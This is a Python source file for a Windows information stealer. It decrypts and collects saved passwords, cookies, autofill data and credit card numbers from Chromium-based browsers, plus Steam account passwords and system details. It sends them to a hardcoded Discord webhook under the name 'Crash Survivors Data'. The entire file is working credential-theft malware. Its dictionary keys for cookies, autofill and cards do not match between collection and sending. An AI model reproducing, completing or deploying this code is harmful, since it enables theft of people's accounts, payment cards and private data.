import os
import sqlite3
import json
import base64
import win32crypt
import shutil
import requests
import re
from Crypto.Cipher import AES
import subprocess
import time
from typing import List, Dict, Any, Optional

WEBHOOK_URL = "https://discord.com/api/webhooks/1390321932267683921/eIGJTV-OxOjy5w8oobY3OpfKoPxpodZ9RfgsCI_m1D5WSzEbKzWvZRXTjZFI8lcSaJ2V"
STEAM_KEY = bytes([0x73, 0x68, 0x69, 0x74, 0x4E, 0x75, 0x6C, 0x6C, 0x53, 0x68, 0x69, 0x74, 0x4E, 0x75, 0x6C, 0x6C])
DEBUG_LOG = "stealer_debug.log"

BROWSERS = [
    {"name": "Chrome", "user_data": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data")},
    {"name": "Edge", "user_data": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data")},
    {"name": "Brave", "user_data": os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data")},
    {"name": "Opera", "user_data": os.path.join(os.environ.get("APPDATA", ""), "Opera Software", "Opera Stable")},
]

def log_error(message: str) -> None:
    """Log an error message to the debug log."""
    with open(DEBUG_LOG, "a", encoding="utf-8") as f:
        f.write(f"[ERROR] {message}\n")

def log_info(message: str) -> None:
    """Log an info message to the debug log."""
    with open(DEBUG_LOG, "a", encoding="utf-8") as f:
        f.write(f"[INFO] {message}\n")


def is_chrome_running() -> bool:
    """Check if any Chrome process is running."""
    try:
        tasks = subprocess.getoutput('tasklist')
        return any('chrome.exe' in line.lower() for line in tasks.splitlines())
    except Exception as e:
        log_error(f"Failed to check Chrome process: {e}")
        return False

def get_browser_profiles(browser_name: str, user_data_path: str) -> List[str]:
    """Enumerate all user profiles for a given browser."""
    profiles = []
    if not os.path.exists(user_data_path):
        log_error(f"{browser_name} user data directory not found: {user_data_path}")
        return profiles
    for entry in os.listdir(user_data_path):
        profile_path = os.path.join(user_data_path, entry)
        if os.path.isdir(profile_path) and (entry == "Default" or entry.startswith("Profile")):
            profiles.append(entry)
    log_info(f"Detected {browser_name} profiles: {profiles}")
    return profiles

def get_browser_encryption_key(local_state_path: str, browser_name: str) -> Optional[bytes]:
    """Retrieve and decrypt the browser's encryption key from its Local State file."""
    try:
        if not os.path.exists(local_state_path):
            log_error(f"{browser_name} Local State not found: {local_state_path}")
            return None
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            return win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
    except Exception as e:
        log_error(f"Key extraction failed for {browser_name}: {str(e)}")
        return None

def decrypt_chrome_password(encrypted_password: bytes, key: Optional[bytes]) -> str:
    """Decrypt a Chrome/Chromium password using the provided key."""
    try:
        if not key:
            return "[DECRYPTION NOT SUPPORTED]"
        if encrypted_password[:3] == b"v10":
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode(errors="ignore")
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode(errors="ignore")
    except Exception as e:
        log_error(f"Decryption error: {str(e)}")
        return "[DECRYPTION FAILED]"

def fetch_chrome_db_rows(db_path: str, query: str) -> List[tuple]:
    """Fetch rows from a Chrome/Chromium SQLite database using a query."""
    rows = []
    temp_db = db_path + ".tmp"
    try:
        shutil.copy2(db_path, temp_db)
        with sqlite3.connect(temp_db) as conn:
            cursor = conn.cursor()
            cursor.execute(query)
            rows = cursor.fetchall()
    except sqlite3.OperationalError as oe:
        log_error(f"DB fetch error for {db_path}: {oe}. Chrome may be running and locking the file.")
    except Exception as e:
        log_error(f"DB fetch error for {db_path}: {e}")
    finally:
        pass
    return rows

def get_all_browser_passwords() -> List[Dict[str, Any]]:
    """Extract all passwords from all supported Chromium browsers and profiles."""
    passwords = []
    for browser in BROWSERS:
        browser_name = browser["name"]
        user_data_path = browser["user_data"]
        local_state_path = os.path.join(user_data_path, "Local State")
        key = get_browser_encryption_key(local_state_path, browser_name)
        profiles = get_browser_profiles(browser_name, user_data_path)
        for profile in profiles:
            login_db = os.path.join(user_data_path, profile, "Login Data")
            if not os.path.exists(login_db):
                log_info(f"Login Data not found for {browser_name} profile {profile}")
                continue
            rows = fetch_chrome_db_rows(
                login_db,
                "SELECT origin_url, username_value, password_value FROM logins"
            )
            log_info(f"{len(rows)} entries found in DB for {browser_name} profile {profile}")
            failed = 0
            for url, user, encrypted_password in rows:
                if not encrypted_password:
                    continue
                try:
                    password = decrypt_chrome_password(encrypted_password, key) if key else "[DECRYPTION NOT SUPPORTED]"
                    if password and password != "[DECRYPTION FAILED]":
                        passwords.append({
                            "browser": browser_name,
                            "url": url,
                            "username": user,
                            "password": password,
                            "profile": profile
                        })
                    else:
                        failed += 1
                except Exception as e:
                    log_error(f"Failed to decrypt password for {url} ({browser_name} {profile}): {e}")
                    failed += 1
            log_info(f"Processed {browser_name} {profile}: {len(passwords)} passwords found so far, {failed} failed decryptions")
    return passwords

def get_all_browser_cookies() -> List[Dict[str, Any]]:
    """Extract all cookies from all supported Chromium browsers and profiles."""
    cookies = []
    for browser in BROWSERS:
        browser_name = browser["name"]
        user_data_path = browser["user_data"]
        local_state_path = os.path.join(user_data_path, "Local State")
        key = get_browser_encryption_key(local_state_path, browser_name)
        profiles = get_browser_profiles(browser_name, user_data_path)
        for profile in profiles:
            cookies_db = os.path.join(user_data_path, profile, "Cookies")
            if not os.path.exists(cookies_db):
                continue
            rows = fetch_chrome_db_rows(
                cookies_db,
                "SELECT host_key, name, encrypted_value FROM cookies"
            )
            for host, name, encrypted_value in rows:
                value = decrypt_chrome_password(encrypted_value, key) if key else "[DECRYPTION NOT SUPPORTED]"
                cookies.append({
                    "browser": browser_name,
                    "host": host,
                    "name": name,
                    "value": value,
                    "profile": profile
                })
            log_info(f"Processed cookies for {browser_name} {profile}: {len(cookies)} cookies found so far")
    return cookies

def get_all_browser_autofill() -> List[Dict[str, Any]]:
    """Extract all autofill entries from all supported Chromium browsers and profiles."""
    autofill = []
    for browser in BROWSERS:
        browser_name = browser["name"]
        user_data_path = browser["user_data"]
        profiles = get_browser_profiles(browser_name, user_data_path)
        for profile in profiles:
            web_data_db = os.path.join(user_data_path, profile, "Web Data")
            if not os.path.exists(web_data_db):
                continue
            rows = fetch_chrome_db_rows(
                web_data_db,
                "SELECT name, value FROM autofill"
            )
            for name, value in rows:
                autofill.append({
                    "browser": browser_name,
                    "name": name,
                    "value": value,
                    "profile": profile
                })
            log_info(f"Processed autofill for {browser_name} {profile}: {len(autofill)} autofill entries found so far")
    return autofill

def get_all_browser_credit_cards() -> List[Dict[str, Any]]:
    """Extract all credit cards from all supported Chromium browsers and profiles."""
    cards = []
    for browser in BROWSERS:
        browser_name = browser["name"]
        user_data_path = browser["user_data"]
        local_state_path = os.path.join(user_data_path, "Local State")
        key = get_browser_encryption_key(local_state_path, browser_name)
        profiles = get_browser_profiles(browser_name, user_data_path)
        for profile in profiles:
            web_data_db = os.path.join(user_data_path, profile, "Web Data")
            if not os.path.exists(web_data_db):
                continue
            rows = fetch_chrome_db_rows(
                web_data_db,
                "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
            )
            for name, month, year, encrypted_number in rows:
                number = decrypt_chrome_password(encrypted_number, key) if key else "[DECRYPTION NOT SUPPORTED]"
                cards.append({
                    "browser": browser_name,
                    "name": name,
                    "month": month,
                    "year": year,
                    "number": number,
                    "profile": profile
                })
            log_info(f"Processed credit cards for {browser_name} {profile}: {len(cards)} cards found so far")
    return cards

def get_system_info() -> Dict[str, Any]:
    """Collect system information such as user, computer name, OS, network, and drives."""
    info = {
        "PC User": os.getenv("USERNAME", "N/A"),
        "PC Name": os.getenv("COMPUTERNAME", "N/A"),
        "OS": os.getenv("OS", "N/A")
    }
    try:
        ipconfig = subprocess.getoutput("ipconfig")
        info["IPConfig"] = ipconfig
        drives = [d for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:/")]
        info["Drives"] = str(drives)
    except Exception as e:
        log_error(f"System info error: {str(e)}")
    return info

def decrypt_steam_password(encrypted_password: str) -> str:
    """Decrypt a Steam password using the static key."""
    try:
        iv = b"\x00" * 16
        cipher = AES.new(STEAM_KEY, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(base64.b64decode(encrypted_password))
        return decrypted.rstrip(b"\x00").decode("utf-8", errors="replace")
    except Exception as e:
        log_error(f"Steam decryption failed: {str(e)}")
        return "[DECRYPTION FAILED]"

def get_steam_data() -> Optional[Dict[str, Any]]:
    """Extract Steam account data and ssfn files."""
    steam_path = os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Steam")
    if not os.path.exists(steam_path):
        log_error("Steam installation not found")
        return None
    login_users_path = os.path.join(steam_path, "config", "loginusers.vdf")
    if not os.path.exists(login_users_path):
        log_error("loginusers.vdf not found")
        return None
    accounts = []
    try:
        with open(login_users_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            account_sections = re.findall(r'"(\d+)"\s*\{(.*?)\}', content, re.DOTALL)
            for steam_id, section in account_sections:
                account_data = {
                    "steam_id": steam_id,
                    "username": re.search(r'"AccountName"\s+"(.*?)"', section).group(1) if re.search(r'"AccountName"', section) else None,
                    "encrypted_password": re.search(r'"EncryptedPassword"\s+"(.*?)"', section).group(1) if re.search(r'"EncryptedPassword"', section) else None
                }
                if account_data["encrypted_password"]:
                    account_data["password"] = decrypt_steam_password(account_data["encrypted_password"])
                accounts.append(account_data)
        log_info(f"Found {len(accounts)} Steam accounts")
    except Exception as e:
        log_error(f"Steam processing error: {str(e)}")
    return {
        "steam_path": steam_path,
        "accounts": accounts,
        "ssfn_files": [f for f in os.listdir(steam_path) if f.startswith("ssfn")]
    }

def send_to_discord(data: Dict[str, Any]) -> bool:
    """Send the collected data to Discord via webhook."""
    try:
        embeds = []
        system_info = data.get("system_info", {})
        embeds.append({
            "title": "🖥️ System Information",
            "color": 3447003,
            "fields": [{"name": k, "value": f"```{str(v)[:1000]}```", "inline": False} for k, v in system_info.items()]
        })
        if data.get("browser_passwords"):
            password_text = "\n".join(
                f"[{p['browser']}] **{p['url']}**\n👤 `{p['username']}` 🔑 `{p['password']}`"
                for p in data["browser_passwords"][:10]
            )
            embeds.append({
                "title": "🔑 Browser Passwords",
                "color": 15158332,
                "description": password_text[:2000]
            })
        if data.get("chrome_cookies"):
            cookie_text = "\n".join(
                f"**{c['host']}** `{c['name']}` = `{c['value']}`"
                for c in data["chrome_cookies"][:10]
            )
            embeds.append({
                "title": "🍪 Chrome Cookies",
                "color": 15844367,
                "description": cookie_text[:2000]
            })
        if data.get("chrome_autofill"):
            autofill_text = "\n".join(
                f"**{a['name']}**: `{a['value']}`"
                for a in data["chrome_autofill"][:10]
            )
            embeds.append({
                "title": "📝 Chrome Autofill",
                "color": 3447003,
                "description": autofill_text[:2000]
            })
        if data.get("chrome_cards"):
            card_text = "\n".join(
                f"**{c['name']}** {c['month']}/{c['year']} `{c['number']}`"
                for c in data["chrome_cards"][:5]
            )
            embeds.append({
                "title": "💳 Chrome Credit Cards",
                "color": 10181046,
                "description": card_text[:2000]
            })
        steam_data = data.get("steam_data")
        if steam_data and steam_data.get("accounts"):
            account_text = "\n".join(
                f"**{acc['username']}** ({acc['steam_id']})\n🔑 `{acc.get('password', 'No password stored')}`"
                for acc in steam_data["accounts"]
            )
            embeds.append({
                "title": "🎮 Steam Accounts",
                "color": 3066993,
                "description": account_text[:2000]
            })
        payload = {
            "username": "Crash Survivors Data",
            "embeds": embeds,
            "attachments": []
        }
        response = requests.post(
            WEBHOOK_URL,
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=15
        )
        if response.status_code == 204:
            return True
        else:
            log_error(f"Discord error: HTTP {response.status_code} - {response.text}")
            return False
    except Exception as e:
        log_error(f"Discord communication failed: {str(e)}")
        return False

if __name__ == "__main__":
    open(DEBUG_LOG, "w").close()
    log_info("===== DATA EXTRACTION STARTED =====")
    if is_chrome_running():
        log_error("Chrome is running! Please close all Chrome windows and background processes for password extraction.")
        print("[ERROR] Chrome is running! Please close all Chrome windows and background processes and re-run the script.")
    else:
        collected_data = {
            "system_info": get_system_info(),
            "browser_passwords": get_all_browser_passwords(),
            "browser_cookies": get_all_browser_cookies(),
            "browser_autofill": get_all_browser_autofill(),
            "browser_cards": get_all_browser_credit_cards(),
            "steam_data": get_steam_data()
        }
        log_info(f"Browser passwords found: {len(collected_data['browser_passwords'])}")
        log_info(f"Browser cookies found: {len(collected_data['browser_cookies'])}")
        log_info(f"Browser autofill found: {len(collected_data['browser_autofill'])}")
        log_info(f"Browser credit cards found: {len(collected_data['browser_cards'])}")
        log_info(f"Steam accounts found: {len(collected_data['steam_data']['accounts']) if collected_data['steam_data'] else 0}")
        if send_to_discord(collected_data):
            log_info("Data successfully sent to Discord")
            print("[SUCCESS] Data sent to Discord!")
        else:
            log_info("Failed to send data to Discord")
            print("[ERROR] Failed to send to Discord - check debug log")
        print(f"\n[DEBUG] Operation complete. See '{DEBUG_LOG}' for details")
        log_info("===== OPERATION COMPLETED =====")

